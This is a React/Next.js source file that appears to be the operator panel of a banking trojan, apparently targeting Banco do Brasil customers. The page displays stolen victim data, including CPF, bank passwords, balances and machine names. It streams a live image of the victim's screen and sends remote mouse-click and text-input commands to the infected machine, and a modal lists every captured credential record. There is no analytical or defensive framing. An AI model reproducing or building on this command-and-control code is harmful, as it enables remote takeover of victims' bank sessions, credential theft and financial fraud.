import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/router';
import {
  Box,
  Container,
  Typography,
  TextField,
  Modal,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  IconButton,
  Chip,
  Stack,
  Button,
} from '@mui/material';
import TableRowsIcon from '@mui/icons-material/TableRows';
import CloseIcon from '@mui/icons-material/Close';
import Image from 'next/image';
import { format } from 'date-fns';

const BBDetailsPage = () => {
  const [details, setDetails] = useState({});
  const [allRecords, setAllRecords] = useState([]);
  const [modalOpen, setModalOpen] = useState(false);
  const [imageSrc, setImageSrc] = useState('');
  const [commandInput, setCommandInput] = useState('');
  const router = useRouter();
  const { id } = router.query;

  const fetchData = async () => {
    try {
      const response = await axios.get(`/api/bbb?id=${id}`);
      setDetails(response.data);
    } catch (error) {
      console.error('Erro ao chamar /api/bbb:', error.message);
    }
  };

  const fetchAllRecords = async () => {
    try {
      const response = await axios.get(`/api/bbb?id=${id}&all=true`);
      setAllRecords(response.data);
    } catch (error) {
      console.error('Erro ao chamar /api/bbb:', error.message);
    }
  };

  useEffect(() => {
    if (id) {
      fetchData();
      const interval = setInterval(fetchData, 1000); // Polling interval de 1 segundo
      return () => clearInterval(interval);
    }
  }, [id]);

  useEffect(() => {
    if (details.PC && details.USER) {
      const interval = setInterval(() => {
        setImageSrc(`http://localhost:3000/tela/cliente/${details.PC}_${details.USER}.jpg?${new Date().getTime()}`);
      }, 300); // Polling interval de 0.3 segundos
      return () => clearInterval(interval);
    }
  }, [details.PC, details.USER]);

  const handleOpenModal = async () => {
    await fetchAllRecords();
    setModalOpen(true);
  };

  const handleCloseModal = () => {
    setModalOpen(false);
  };

  const isOnline = (status) => status === 1;

  const formatDate = (dateString) => {
    if (!dateString) return '';
    const date = new Date(dateString);
    return format(date, 'dd/MM/yyyy HH:mm:ss');
  };

  const handleImageClick = async (e) => {
    const rect = e.target.getBoundingClientRect();
    const x = Math.round(e.clientX - rect.left);
    const y = Math.round(e.clientY - rect.top);

    try {
      await axios.post('/api/commands', {
        FK_ID_NFCT: id,
        COMANDO: `click;${x};${y}`
      });
    } catch (error) {
      console.error('Erro ao criar comando:', error.message);
    }
  };

  const handleCommandInputChange = (e) => {
    setCommandInput(e.target.value);
  };

  const handleCommandSubmit = async () => {
    if (commandInput.trim() === '') return;

    try {
      await axios.post('/api/commands', {
        FK_ID_NFCT: id,
        COMANDO: `input;${commandInput}`
      });
      setCommandInput('');
    } catch (error) {
      console.error('Erro ao criar comando:', error.message);
    }
  };

  return (
    <Container maxWidth="lg" sx={{ display: 'flex', height: '100vh', padding: '20px' }}>
      <Box
        sx={{
          width: '300px',
          backgroundColor: '#ffffff',
          boxShadow: '2px 0 5px rgba(0, 0, 0, 0.1)',
          padding: '20px',
          display: 'flex',
          flexDirection: 'column',
          gap: '10px',
        }}
      >
        <Box display="flex" alignItems="center" justifyContent="space-between">
          <Image src="/bb.png" alt="BB" width={50} height={50} />
          <Box display="flex" alignItems="center">
            <IconButton onClick={handleOpenModal}>
              <TableRowsIcon />
            </IconButton>
          </Box>
        </Box>
        <Stack direction="row" spacing={1} style={{ alignItems: 'center' }}>
          <Typography>COLETOR:</Typography>
          <Chip
            label={isOnline(details.IS_COLLECTOR_ONLINE) ? 'ONLINE' : 'OFFLINE'}
            color={isOnline(details.IS_COLLECTOR_ONLINE) ? 'success' : 'default'}
            variant="filled"
          />
        </Stack>
        <Stack direction="row" spacing={1} style={{ alignItems: 'center' }}>
          <Typography>BROWSER:</Typography>
          <Chip
            label={isOnline(details.IS_BROWSER_ONLINE) ? 'ONLINE' : 'OFFLINE'}
            color={isOnline(details.IS_BROWSER_ONLINE) ? 'success' : 'default'}
            variant="filled"
          />
        </Stack>
        <TextField
          label="PC"
          value={details.PC || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="USER"
          value={details.USER || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="BANCO"
          value={details.BANCO || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="STATUSRESUMO"
          value={details.STATUSRESUMO || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Perfil"
          value={details.PERFIL || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Tipo de Acesso"
          value={details.TIPOACESSO || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="ChaveJ/CPF"
          value={details.CHAVEJ || details.CPF || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Senha"
          value={details.SENHA || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Data de Inclusão"
          value={formatDate(details.DT_INCLUSAO)}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Saldo"
          value={details.SALDO || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
        <TextField
          label="Total"
          value={details.TOTAL || ''}
          InputProps={{ readOnly: true }}
          margin="dense"
          size="small"
        />
      </Box>
      <Box
        sx={{
          flexGrow: 1,
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '20px',
          backgroundColor: '#f5f5f5',
          position: 'relative',
        }}
      >
        <Box sx={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
          <TextField
            label="Enviar Comando"
            value={commandInput}
            onChange={handleCommandInputChange}
            size="small"
            sx={{ flexGrow: 1 }}
          />
          <Button variant="contained" onClick={handleCommandSubmit}>Enviar</Button>
        </Box>
        <div style={{
          width: '1200px', 
          height: '700px', 
          overflow: 'hidden', 
          filter: isOnline(details.IS_BROWSER_ONLINE) ? 'none' : 'grayscale(100%)',
          border: isOnline(details.IS_BROWSER_ONLINE) ? '5px solid green' : 'none'
        }}>
          <img
            src={imageSrc}
            alt="Transmissão de Tela"
            style={{ width: '100%', height: '100%', objectFit: 'contain' }}
            onClick={handleImageClick}
          />
        </div>
      </Box>

      <Modal open={modalOpen} onClose={handleCloseModal}>
        <Box
          sx={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            height: '100vh',
          }}
        >
          <Paper sx={{ width: '80%', maxHeight: '80vh', position: 'relative' }}>
            <IconButton
              onClick={handleCloseModal}
              sx={{ position: 'absolute', right: 10, top: 10 }}
            >
              <CloseIcon />
            </IconButton>
            <TableContainer>
              <Table stickyHeader aria-label="sticky table">
                <TableHead>
                  <TableRow>
                    <TableCell>Perfil</TableCell>
                    <TableCell>Tipo de Acesso</TableCell>
                    <TableCell>ChaveJ</TableCell>
                    <TableCell>CPF</TableCell>
                    <TableCell>Senha</TableCell>
                    <TableCell>Data de Inclusão</TableCell>
                    <TableCell>Saldo</TableCell>
                    <TableCell>Total</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {allRecords.map((record) => (
                    <TableRow key={record.id}>
                      <TableCell>{record.PERFIL}</TableCell>
                      <TableCell>{record.TIPOACESSO}</TableCell>
                      <TableCell>{record.CHAVEJ}</TableCell>
                      <TableCell>{record.CPF}</TableCell>
                      <TableCell>{record.SENHA}</TableCell>
                      <TableCell>
                        <TextField
                          value={formatDate(record.DT_INCLUSAO)}
                          InputProps={{ readOnly: true }}
                          margin="dense"
                          size="small"
                        />
                      </TableCell>
                      <TableCell>{record.SALDO}</TableCell>
                      <TableCell>{record.TOTAL}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          </Paper>
        </Box>
      </Modal>
    </Container>
  );
};

export default BBDetailsPage;
